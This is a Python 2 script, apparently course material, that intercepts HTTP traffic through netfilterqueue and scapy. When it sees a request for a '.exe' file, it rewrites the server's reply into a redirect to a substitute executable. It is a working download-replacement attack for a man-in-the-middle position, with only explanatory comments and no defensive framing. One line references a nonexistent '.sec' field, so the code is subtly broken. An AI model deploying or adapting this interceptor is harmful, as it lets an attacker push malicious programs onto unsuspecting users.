#!/usr/bin/env python
#running on python2
#use ping -c 1 www.bing.com to get the result
import netfilterqueue
import scapy.all as scapy
#
ack_list=[]
def set_load(pkt,load):
    pkt[scapy.Raw].load =load
    # set the raw layers load to our custom file
    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum
    del pkt[scapy.TCP].chksum
    return pkt

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    #converts packet into a readable scapy packet
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport ==80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                #appends the ack field to a list and stores it
            #condition checks the raw layers load to see if it contains .exe or any other thing we want
        #condition identifies if a packet is leaving the destination port
        elif scapy_packet[scapy.TCP].sport ==80:
            if scapy_packet[scapy.TCP].sec in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].sec)
                    print("[+] Replacing file")
                    custom_packet=set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.exe\n\n")
                    
                    #set packet being returned to our custom packet
                    packet.set_payload(str(custom_packet))

            #condition checks if the sequence is in the ack list, if it is, replace it

        #condition indetifies if a packet is entering the source port

    packet.accept()
queue=netfilterqueue.NetfilterQueue()
#creates an instance of the netfilter onject
queue.bind(0, process_packet )
#connected the queue to the queue we previously created
queue.run()
